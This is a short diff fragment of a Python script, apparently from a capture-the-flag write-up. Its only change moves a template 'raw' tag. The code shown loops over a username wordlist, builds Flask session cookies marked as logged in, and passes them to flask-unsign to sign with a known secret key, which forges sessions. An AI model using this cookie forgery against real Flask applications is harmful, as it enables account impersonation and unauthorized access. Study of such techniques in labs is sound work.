@@ -94,8 +94,8 @@ secret_key = 'secret123'
 
 with open(wordlist_path, 'r') as file:
     for user in file:
-        user = user.strip()
-{% raw %} cookie_data = f"{{'logged_in': True, 'username': '{user}'}}" {% endraw %}
+        user = user.strip() {% raw %}
+        cookie_data = f"{{'logged_in': True, 'username': '{user}'}}" {% endraw %}
         cmd = [
             'flask-unsign',
             '--sign',
